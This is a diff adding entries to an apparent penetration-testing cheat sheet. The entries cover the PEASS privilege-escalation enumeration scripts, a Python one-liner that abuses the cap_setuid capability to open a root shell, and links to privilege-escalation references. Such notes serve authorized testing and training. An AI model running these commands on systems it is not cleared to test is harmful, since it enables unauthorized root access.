@@ -66,6 +66,33 @@
 
 ---
 
+# peass - privilege escalation awesome scripts suite
+- service: windows
+- service: linux
+- tactics: enumeration
+
+## very easy to use on linux
+- `./linpeas.sh`
+
+## windows has multiple versions
+- `winpeasx64.exe`
+- `winpeasx86.exe`
+- `winpeas.bat`
+
+---
+
+# capabilities
+- service: linux
+- tactics: privilege_escalation
+
+```
+# Check the links at the bottom for more examples and explanation
+```
+## exploit `cap_setuid` capability on python3 to gain a local root-shell
+- `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`
+
+---
+
 # mount
 - service: smb
 - tactics: enumeration
@@ -1172,6 +1199,8 @@ term.cmdloop()
 
 ### linux privilege escalation
 [https://blog.g0tmi1k.com](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
+[hacktricks-capabilities](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities)
+[https://gtfobins.github.io](https://gtfobins.github.io/)
 
 ### windows privilege escalation
 [https://github.com/frizb](https://github.com/frizb/Windows-Privilege-Escalation)
@@ -1185,3 +1214,4 @@ term.cmdloop()
 [http://www.harmj0y.net](http://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/)  
 [https://github.com/PowerShellEmpire](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp)  
 [http://pwnwiki.io](http://pwnwiki.io/#!privesc/windows/index.md)
+[https://lolbas-project.github.io/#](https://lolbas-project.github.io/)
